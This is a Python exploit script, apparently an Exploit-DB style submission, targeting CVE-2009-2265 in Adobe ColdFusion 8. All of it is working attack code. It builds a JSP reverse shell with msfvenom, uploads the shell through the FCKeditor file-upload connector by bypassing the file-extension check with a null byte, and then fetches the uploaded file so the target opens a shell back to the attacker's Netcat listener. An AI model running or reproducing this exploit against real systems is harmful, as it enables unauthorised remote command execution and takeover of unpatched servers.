#!/bin/python3

# Exploit Title: Adobe ColdFusion 8 - Remote Command Execution (RCE)
# Date: 25/06/2023
# Exploit Author: Polar1s
# Vendor Homepage: https://www.adobe.com/sea/products/coldfusion-family.html
# CVE : CVE-2009-2265


# DO NOT forget to start Netcat listening on specified <lport>

import io
import mimetypes
import os
import urllib.request
import uuid
from multiprocessing import Process

# This class is responsible for constructing a body for POST request
class MultiPartForm:
	
	def __init__(self):
		self.files = [] #file to send
		self.boundary = uuid.uuid4().hex.encode('utf-8') #generating boundary
		return
		
	def get_content_type(self):
		return 'multipart/form-data; boundary={}'.format(self.boundary.decode('utf-8'))
		
	def add_file(self, fieldname, filename, fileHandler, mimetype=None):
		file_data = fileHandler.read()
		
		if mimetype is None:
			mimetype = (mimetypes.guess_type(filename)[0] or 'text/plain')
		
		self.files.append((fieldname, filename, mimetype, file_data))
		return
	
	@staticmethod
	def attached_file(name, filename):
		return (f'Content-Disposition: form-data; name="{name}"; filename="{filename}"\r\n').encode('utf-8')
		
	@staticmethod
	def file_content_type(content_type):
		return (f'Content-Type: {content_type}\r\n'.encode('utf-8'))
	
	def __bytes__(self):
		buffer = io.BytesIO()
		boundary = b'--' + self.boundary +b'\r\n'
		
		for fieldname, filename, f_content_type, file_data in self.files:
			buffer.write(boundary)
			buffer.write(self.attached_file(fieldname, filename))
			buffer.write(self.file_content_type(f_content_type))
			buffer.write(b'\r\n')
			buffer.write(file_data)
			buffer.write(b'\r\n')
		
		buffer.write(b'--' + self.boundary + b'--\r\n')
		return buffer.getvalue()
		
def exec_payload():
	print("Executing payload...")
	print(urllib.request.urlopen(f'http://{rhost}:{rport}/userfiles/file/{filename}.jsp'))
	
if __name__ == '__main__':
	# CHANGE HERE
	lhost = '10.10.16.14'
	lport = '9003'
	rhost = "10.10.10.11"
	rport = 8500
	filename = uuid.uuid4().hex
	
	# Generating payload
	print("\nmsfvenom is generating payload...")
	os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.jsp')
    	
    	# Form data encoding
	form = MultiPartForm()
	form.add_file('newfile', filename + '.txt', fileHandler=open(filename + '.jsp', 'rb'))
	data = bytes(form)
    	
    	# Request creation
	request = urllib.request.Request(f'http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/{filename}.jsp%00', data=data)
	request.add_header('Content-type', form.get_content_type())
	request.add_header('Content-length', len(data))
    	
    	# Sending request and printing response
	print('\nSending request and printing response...')
	print(urllib.request.urlopen(request).read().decode('utf-8'))	
	
	# Deleting payload file
	print("\nDeleting payload file...")
	os.system(f'rm {filename}.jsp')
	
	#Executing payload
	p = Process(target=exec_payload, daemon=True)
	p.start()
	p.join()
